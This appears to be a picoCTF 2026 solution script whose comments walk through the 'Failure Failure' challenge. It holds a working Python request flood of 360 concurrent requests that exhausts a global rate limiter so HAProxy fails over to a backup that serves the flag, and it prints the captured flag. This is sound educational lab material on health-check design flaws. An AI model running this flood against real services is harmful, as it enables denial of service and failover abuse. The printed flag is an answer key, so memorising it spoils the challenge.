#!/usr/bin/env bash
set -euo pipefail

# Challenge Name: Failure Failure
# Category: General Skills
# Difficulty: Medium
# Event: picoCTF 2026
# Author: DARKRAICG492
#
# Description:
# "Welcome to Failure Failure — a high-available system.
# This challenge simulates a real-world failover scenario where one server is
# prioritized over the other. A load balancer stands between you and the truth
# — and it won't hand over the flag until you force its hand."
#
# Given information from the challenge:
# URL: http://mysterious-sea.picoctf.net:50441/
# Files: app.py, haproxy.cfg
#
# Core lesson:
# High availability can become a security problem when health checks and
# application behavior interact in unsafe ways.
#
# The backend application applies a global rate limit. When that limit is
# exceeded, it returns 503. HAProxy interprets repeated non-200 health checks as
# backend failure and automatically routes traffic to the backup server.
#
# The backup server is not supposed to be the normal user path, but it is the
# only one with the flag enabled.
#
# Real-world analogy:
# A production system may have:
# - primary node: user-safe behavior
# - backup node: emergency or internal behavior
#
# If an attacker can deliberately trigger the health-monitoring logic, they may
# force traffic onto an alternate backend with different data, configuration, or
# secrets. That is not memory corruption. It is control over operational state.
#
# Step 1: Read the app code.
# Manual command:
# sed -n '1,220p' app.py
#
# Reason:
# The Flask app shows:
# - a global limiter key that always returns "global"
# - a default limit of 300 requests per minute
# - a custom 429 handler that returns 503 instead
#
# That is the critical design mistake:
# the application converts rate-limit events into the same status code that a
# load balancer would often treat as server failure.
#
# Step 2: Read the HAProxy config.
# Manual command:
# sed -n '1,260p' haproxy.cfg
#
# Reason:
# The config shows:
#
# backend servers
#     option httpchk GET /
#     http-check expect status 200
#     server s1 *:8000 check inter 2s fall 2 rise 3
#     server s2 *:9000 check backup inter 2s fall 2 rise 3
#
# This means:
# - HAProxy health-checks GET /
# - it expects HTTP 200
# - after 2 failed checks, the primary is considered down
# - the backup is then used
#
# Step 3: Notice how the flag is gated.
# Manual command:
# grep -n 'IS_BACKUP\\|FLAG' app.py
#
# Reason:
# The route / returns:
# - "No flag in this service" on the primary
# - the real flag when IS_BACKUP=yes on the backup
#
# So the exploitation goal is not "find a hidden endpoint."
# It is "push HAProxy onto the backup."
#
# Step 4: Trigger the global rate limit.
# Manual command:
# python3 - <<'PY'
# import requests
# from concurrent.futures import ThreadPoolExecutor, as_completed
# base = 'http://mysterious-sea.picoctf.net:50441/'
# def hit(_):
#     try:
#         return requests.get(base, timeout=5).status_code
#     except Exception:
#         return 'ERR'
# with ThreadPoolExecutor(max_workers=40) as ex:
#     list(as_completed(ex.submit(hit, i) for i in range(360)))
# PY
#
# Reason:
# We need enough traffic to push the shared limiter past 300 requests per
# minute. Using concurrent requests is more reliable than slow manual refreshes.
#
# Why this works:
# The app's key function is:
#   return "global"
# So every request counts against the same bucket. There is no per-IP isolation.
#
# Step 5: Let HAProxy observe the failures.
# Manual command:
# curl http://mysterious-sea.picoctf.net:50441/
#
# Reason:
# Once the primary starts returning 503, HAProxy's own health checks also see
# those failures. After two failed checks, traffic is routed to the backup.
#
# In the solved instance, the same "/" endpoint immediately began returning the
# backup response containing the flag.
#
# Real-world security lesson:
# Security-sensitive behavior should not differ dramatically between primary and
# backup nodes unless access controls are identical. Also, rate-limit events
# should not masquerade as availability failures that influence load-balancer
# routing.
#
# Flag obtained:
# picoCTF{f41l0v3r_f0r_7h3_w1n_df560c35}

base_url="${1:-http://mysterious-sea.picoctf.net:50441/}"

python3 - "$base_url" <<'PY'
import re
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

base = sys.argv[1].rstrip("/") + "/"

def hit(_):
    try:
        r = requests.get(base, timeout=5)
        return r.status_code
    except Exception:
        return "ERR"

# Saturate the primary's global rate limit so it starts returning 503.
with ThreadPoolExecutor(max_workers=40) as ex:
    futures = [ex.submit(hit, i) for i in range(360)]
    for _ in as_completed(futures):
        pass

# Poll the frontend until HAProxy switches to the backup and the flag appears.
for _ in range(15):
    r = requests.get(base, timeout=10)
    match = re.search(r"picoCTF\{[^}]+\}", r.text)
    if match:
        print(match.group(0))
        raise SystemExit(0)
    time.sleep(1)

raise SystemExit("Flag not found. Try rerunning the script against a fresh instance.")
PY
